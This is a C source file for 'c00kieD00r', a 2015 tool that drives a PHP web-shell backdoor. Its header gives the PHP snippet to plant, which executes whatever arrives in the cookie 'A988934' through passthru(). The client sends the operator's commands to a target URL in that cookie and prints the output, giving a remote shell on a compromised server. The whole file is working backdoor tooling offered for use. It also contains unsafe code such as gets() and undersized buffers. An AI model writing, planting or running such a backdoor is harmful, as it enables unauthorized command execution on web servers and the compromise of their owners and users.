
/* 
** 
**                        .---. .---. 
**                       :     : o   :    me want c00kie!
**                   _..-:   o :     :-.._    /
**               .-''  '  `---' `---' "   ``-.    
**             .'   "   '  "  .    "  . '  "  `.  
**            :   '.---.,,.,...,.,.,.,..---.  ' ;
**            `. " `.                     .' " .'
**             `.  '`.                   .' ' .'
**              `.    `-._           _.-' "  .'  .----.
**                `. "    '"--...--"'  . ' .'  .'  o   `.
**                .'`-._'    " .     " _.-'`. :       o  :
**          jgs .'      ```--.....--'''    ' `:_ o       :
**            .'    "     '         "     "   ; `.;";";";'
**           ;         '       "       '     . ; .' ; ; ;
**          ;     '         '       '   "    .'      .-'
**          '  "     "   '      "           "    _.-'
**
**                   C 0 0 K 1 E S D 0 0 R
** 
** Autor: Constantine.
** Data: 10 de março de 2015.
** Site: http://constantine.sourceforge.net
** GitHub: https://github.com/jessesilva/
** 
** Compile...
**   Windows: gcc.exe c00kieD00r.c -lws2_32 -o c00kieD00r.exe
**   Linux: gcc c00kieD00r.c -o c00kieD00r
** 
** Help...
**   ./c00kieD00r
**   
** PHP File...
** 
**   if (isset($_COOKIE['A988934']) && !empty($_COOKIE['A988934'])) {
**      die(passthru($_COOKIE['A988934']));
**   }
** 
** Greatz for L1sb3th and P0cl4bs Team ( https://github.com/P0cL4bs )
** 
*/ 

/* Comente essa linha se você é usuário do Linux. */
#define WINDOWS_USER

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef WINDOWS_USER
  #include <Winsock2.h>
  #include <ws2tcpip.h>  
  #include <Windows.h>
#else
  #include <sys/types.h>
  #include <sys/socket.h>
  #include <netinet/in.h>
  #include <netdb.h>
#endif

void die (char *string, int code) {
  printf(string);
  exit(code);
}

int main (int argc, char *argv[]) 
{ 
  char *banner [] = {
    "\n                        .---. .---. \n",
    "                       :     : o   :    me want c00kie!\n",
    "                   _..-:   o :     :-.._    /\n",
    "               .-''  '  `---' `---' \"   ``-.    \n",
    "             .'   \"   '  \"  .    \"  . '  \"  `.  \n",
    "            :   '.---.,,.,...,.,.,.,..---.  ' ;\n",
    "            `. \" `.                     .' \" .'\n",
    "             `.  '`.                   .' ' .'\n",
    "              `.    `-._           _.-' \"  .'  .----.\n",
    "                `. \"    '\"--...--\"'  . ' .'  .'  o   `.\n",
    "                .'`-._'    \" .     \" _.-'`. :       o  :\n",
    "          jgs .'      ```--.....--'''    ' `:_ o       :\n",
    "            .'    \"     '         \"     \"   ; `.;\";\";\";'\n",
    "           ;         '       \"       '     . ; .' ; ; ;\n",
    "          ;     '         '       '   \"    .'      .-'\n",
    "          '  \"     \"   '      \"           \"    _.-'\n\n",
    "                   C 0 0 K 1 E S D 0 0 R\n"
  };

  char *pre_header [] = {
    "User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:35.0) Gecko/20100101 Firefox/35.0\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9\r\n",
    "Accept-Language: en-US,en;q=0.5\r\n",
    "Accept-Encoding: identity\r\n",
    "Connection: Close\r\n\r\n"
  };
  
  char command [256];
  char *response, *header, *ptr;
  char *host, *path, *cookie;
  int cont, sock, chucked = 0, first = 0;
  int port, result = (int) (-1);
  struct sockaddr_in st_addr;
  struct hostent *st_hostent;
  
  #ifdef WINDOWS_USER
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) 
      die("WSAStartup failed!", 1);
  #endif
  
  /* Menssagem de ajuda. */
  if (argc != 3) 
  {
    for (cont = 0; cont != 17; cont++)
      printf("%s", banner[cont]);
    
    printf("       c0d3d by Constantine - constantine.sourceforge.net\n");
    printf("\n\n   Use...\n     %s HOST PORT\n     %s http://host.com/path/page.php 80\n\n   Press '/exit' to close c00kies D00r.\n", argv[0], argv[0]);
    exit(1);
  }
  
  /* Processa porta. */
  port = (int) strtol(argv[2], NULL, 10);
  
  /* Processa URL. */
  if ( !strstr(argv[1], "http://"))
    die("Use 'http://' in URL.\n", 1);
  
  if ( (host = (char *) malloc(strlen(argv[1]))) == NULL || (path = (char *) malloc(strlen(argv[1]))) == NULL )
    die("malloc failed!\n", 1);
  
  memset(host, 0, strlen(argv[1]));
  memset(path, 0, strlen(argv[1]));
  
  if ( (ptr = strstr(argv[1], "http://")) != NULL )
  {
    for (cont = 0, ptr += strlen("http://"); ptr[cont] != '\0'; cont++)
    {
      if (ptr[cont] == '/')
      {
        host[cont] = '\0';
        break;
      }
      host[cont] = ptr[cont];
    }
    
    ptr += cont;
    for (cont = 0; ptr[cont] != '\0'; cont++)
      path[cont] = ptr[cont];
  }
  
  if (host && path) 
  {
    if ( (st_hostent = gethostbyname(host)) == NULL )
      die("gethostbyname failed!\n", 1);

    st_addr.sin_family = AF_INET;
    st_addr.sin_port   = htons(port);
    st_addr.sin_addr.s_addr = *(u_long *)st_hostent->h_addr_list[0];

    /* Exibe banner e status da conexão. */
    for (cont = 0; cont != 17; cont++)
      printf("%s", banner[cont]);
    
    printf("\n Connected in %s:%d\n IP resolved: %s", host, port, inet_ntoa(st_addr.sin_addr));
    
    while (1) 
    {
      if ( (sock = socket(AF_INET, SOCK_STREAM, 0)) < 0 )
          die("socket failed!\n", 1);
        
      if ( (result = connect(sock, (struct sockaddr *)&st_addr, sizeof(st_addr))) < 0 )
        die("connect failed!\n", 1);
      
      /* Formata header. */
      if ( (header = (char *) malloc(256)) == NULL || (response = (char *) malloc(256*5)) == NULL ||
           (cookie = (char *) malloc(256)) == NULL )
        die("malloc failed!\n", 1);
      
      memset(header, 0, 256);
      memset(response, 0, 256*5);
      memset(cookie, 0, 256);
      memset(command, 0, 256);
      
      printf("\n\n$ ");
      gets(command);
      
      /* Remove \n. */
      for (cont = 0; command[cont] != '\0'; cont++)
        if (command[cont] == '\n')
          command[cont] = '\0';
      
      /* Processa comandos. */
      if (strcmp(command, "/exit") == 0)
      {
        free(host);
        free(path);
        free(header);
        free(cookie);
        free(response);
        
        #ifdef WINDOWS_USER
          closesocket(sock);
          WSACleanup();
        #else
          close(sock);
        #endif
        
        printf("\nC00kies D00r Exit3d!\n");
        exit(0);
      }
      
      /* Formata comando. */
      for (cont = 0; command[cont] != '\0'; cont++)
        if (command[cont] == ' ')
          command[cont] = '+';
      
      sprintf(header, "GET %s HTTP/1.1\r\nHost: %s\r\n", path, host);
      sprintf(cookie, "Cookie: A988934=%s\r\n", command);
      
      send(sock, header, strlen(header), 0);
      for (cont = 0; cont != 3; cont++)
        send(sock, pre_header[cont], strlen(pre_header[cont]), 0);
      
      send(sock, cookie, strlen(cookie), 0);
      send(sock, pre_header[4], strlen(pre_header[4]), 0);
      
      while (1)
      {
        memset(response, 0, 256*5);
        result = recv(sock, response, (256*5) - 1, 0);
        
        /* Close connection. */
        if (result == 0 || result < 0) {
          first = 0;
          chucked = 0;
          break;
        }
        
        /* Chuncked data - Fixme. */
        if (chucked == 1 && first == 1)
          if (response)
            if ( ! (response[0] == '0'  && 
                    response[1] == '\r' && 
                    response[2] == '\n'  ) 
               )
            {           
              if ( (ptr = strstr(response, "\r\n0\r\n")) != NULL )
              {
                *ptr = '\0';
                if ( (ptr = strstr(response, "\r\n")) != NULL )
                {
                  ptr += 2;
                  printf("%s", ptr);
                }
              }
              else
                printf("%s", response);
            }
            
        if (chucked == 0)
          if(strstr(response, "Transfer-Encoding: chunked\r\n"))
          {
            chucked = 1;
            if (first == 0) 
            {
              if ( (ptr = strstr(response, "\r\n\r\n")) != NULL ) 
                if ( (ptr = strstr(ptr += 4, "\r\n")) != NULL ) 
                {
                  ptr += 2;
                  first = 1;
                  printf("%s", ptr);
                }
            }
            else {
              if (response)
                printf("%s", response);
            }
          }
          
        /* Normal data. */
        else 
        {
          if (first == 0) 
          {
            if ( (ptr = strstr(response, "\r\n\r\n")) != NULL ) 
            {
              ptr += 4;
              first = 1;
              printf("%s", ptr);
            }
          }
          else {
            if (response)
              printf("%s", response);
          }
        }
      }
      
      free(header);
      free(cookie);
      free(response);
      
      #ifdef WINDOWS_USER
        closesocket(sock);
      #else
        close(sock);
      #endif
    }
    
    free(host);
    free(path);
  }
  
  #ifdef WINDOWS_USER
    WSACleanup();
  #endif
  
  return 0;
}
